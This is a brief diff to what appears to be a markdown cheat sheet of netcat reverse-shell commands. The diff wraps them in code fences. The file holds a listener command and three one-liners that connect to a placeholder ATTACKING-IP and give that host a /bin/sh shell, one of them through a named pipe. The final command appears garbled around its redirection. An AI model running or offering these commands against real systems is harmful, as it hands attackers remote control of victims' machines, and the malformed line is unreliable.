@@ -1,8 +1,9 @@
 ### Start your listner 
+```
 nc -lnvp 80
-
+```
+```
 nc -e /bin/sh ATTACKING-IP 80
-
 /bin/sh | nc ATTACKING-IP 80
-
 rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
+```
